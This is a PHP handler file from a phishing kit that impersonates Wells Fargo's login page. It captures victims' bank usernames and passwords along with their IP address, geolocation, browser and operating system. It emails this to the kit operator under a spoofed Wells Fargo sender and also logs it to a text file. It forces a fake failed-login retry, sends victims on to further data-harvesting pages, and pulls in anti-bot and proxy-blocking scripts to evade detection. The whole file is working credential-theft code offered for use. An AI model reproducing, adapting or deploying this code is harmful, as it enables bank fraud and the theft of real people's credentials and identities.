<?php
ob_start();
session_start();
include('../../Against_bot/east_a/useragent_bot.php');
require '../../Against_bot/east_b/main.php';
include('../../panel/config.php');
include '../../Against_bot/east_b/random.php';
if ($api_protection =="true") {
	include('../../Against_bot/east_b/proxyblock.php');
}

if (trim($_POST['spox_b00T']) != '') {
    header("HTTP/1.0 404 Not Found");
    exit();
}


if(isset($_POST['invalid'])) {


    $v_ip = $_SERVER['REMOTE_ADDR'];
	$userbank = $_SESSION['username'] = $_POST['username'];
    $passwordbank = $_SESSION['password'] = $_POST['password'] ;
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $message = "+ ----- [ ❤️East code❤️ ] -----+\n";
    $message .="| Wellsfargo l0gin : $userbank\n";
    $message .="| Wellsfargo p4ssw0rd : $passwordbank\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip (🏦 WELLSFARGO V3 L0GIN) \n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";


    @mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/login.txt","a+");
	fwrite($save,$message);
	fclose($save);
    
    if ($show_overview_access = "yes") {
		exit(header("Location: ../../oam/overview?origin=".$redirect."&langPref=".$cn.""));
	}
    if ($show_email_access=="yes") {
		exit(header("Location: ../../oam/verification?origin=".$redirect."&langPref=".$cn.""));
	}
    if ($show_contact_information=="yes") {
		exit(header("Location: ../../oam/contact_information?origin=".$redirect."&langPref=".$cn.""));
    }
}



if(isset($_POST['username'])&&isset($_POST['password'])){

    $v_ip = $_SERVER['REMOTE_ADDR'];
	$userbank = $_SESSION['username'] = $_POST['username'];
    $passwordbank = $_SESSION['password'] = $_POST['password'] ;
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $message = "+ ----- [ ❤️East code❤️ ] -----+\n";
    $message .="| Wellsfargo l0gin : $userbank\n";
    $message .="| Wellsfargo p4ssw0rd : $passwordbank\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip (🏦 WELLSFARGO V3 L0GIN) \n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";
    
    
    @mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/login.txt","a+");
	fwrite($save,$message);
	fclose($save);
    
    if ($double_login=="on") {
		exit(header("Location: ../../oam/login?origin=".$redirect."&langPref=".$cn."&invalid=login"));
	}
	if ($show_overview_access = "yes") {
		exit(header("Location: ../../oam/overview?origin=".$redirect."&langPref=".$cn.""));
	}
	if ($show_email_access=="yes") {
		exit(header("Location: ../../oam/verification?origin=".$redirect."&langPref=".$cn.""));
	}
    if ($show_contact_information=="yes") {
		exit(header("Location: ../../oam/contact_information?origin=".$redirect."&langPref=".$cn.""));
    }

}

?>